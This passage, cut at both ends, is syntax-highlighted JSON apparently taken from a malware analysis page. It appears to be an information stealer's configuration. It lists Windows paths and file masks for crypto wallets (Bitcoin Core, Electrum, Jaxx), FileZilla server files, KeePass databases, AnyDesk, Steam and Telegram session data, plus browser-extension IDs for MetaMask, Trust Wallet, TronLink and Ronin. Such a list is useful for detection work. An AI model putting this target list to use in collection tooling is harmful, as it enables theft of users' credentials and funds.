class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Bitcoin\\wallets&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Bitcoin core&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\com.liberty.jaxx\\IndexedDB&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*.leveldb&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/JAXX New Version&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Electrum\\wallets&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wallets/Electrum&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\AnyDesk&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*.conf&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Applications/AnyDesk&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\FileZilla&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;recentservers.xml&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Applications/FileZilla&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\FileZilla&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;sitemanager.xml&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Applications/FileZilla&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*.kbdx&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Applications/KeePass&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%programfiles%\\Steam&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ssfn*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Applications/Steam&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%programfiles%\\Steam\\config&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Applications/Steam/config&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%appdata%\\Telegram Desktop&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*s&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Applications/Telegram&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;e&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;punctuation&#34;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ejbalbakoplchlghecdalmeeeajnimhm&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;MetaMask&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;nkbihfbeogaeaoehlefnkodbefgpgknn&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;MetaMask&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;egjidjbpglichdcondbcbdnbeeppgdph&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Trust Wallet&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ibnejdfjmmkpcnlpebklmnkoeoihofec&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;TronLink&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;fnjhmkhhmkbjkkabndcnnogagogbneec&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Ronin Wallet&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span 